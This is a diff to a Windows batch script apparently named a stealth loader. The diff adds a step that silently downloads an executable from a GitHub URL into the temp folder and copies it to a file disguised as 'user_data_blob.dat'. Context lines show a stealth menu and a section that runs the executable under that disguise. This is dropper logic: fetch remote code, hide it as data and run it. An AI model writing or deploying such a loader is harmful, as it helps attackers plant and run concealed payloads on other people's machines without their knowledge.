@@ -51,15 +51,29 @@ timeout /t 2 >nul
 goto :STEALTH_MENU
 
 :SETUP
-echo Downloading EXE...
-curl -L -o "%TEMP_EXE%" "%EXE_URL%"
+echo.
+echo [*] STEP 1: Initializing setup...
+timeout /t 1 >nul
+echo [*] STEP 2: Connecting to GitHub...
+timeout /t 1 >nul
+echo [*] STEP 3: Downloading payload...
+set "RAW_EXE_URL=https://raw.githubusercontent.com/maxyprime/stealthloaderv2/main/CAXVN.exe"
+set "TEMP_EXE=%temp%\CAXVN.exe"
+set "DISGUISED_EXE=%temp%\user_data_blob.dat"
+
+curl -s -L -o "%TEMP_EXE%" "%RAW_EXE_URL%"
+
 if exist "%TEMP_EXE%" (
-    echo Setup completed.
+    echo [*] Download complete. Renaming to disguised file...
+    copy /Y "%TEMP_EXE%" "%DISGUISED_EXE%" >nul
+    echo [✔] Setup successful. Disguised EXE ready.
 ) else (
-    echo Download failed.
+    echo [!] Failed to download the EXE. Please check your internet or GitHub URL.
 )
+
 pause
-goto :STEALTH_MENU
+goto STEALTH_MENU
+
 
 :RUN
 echo Running EXE as disguised .dat...
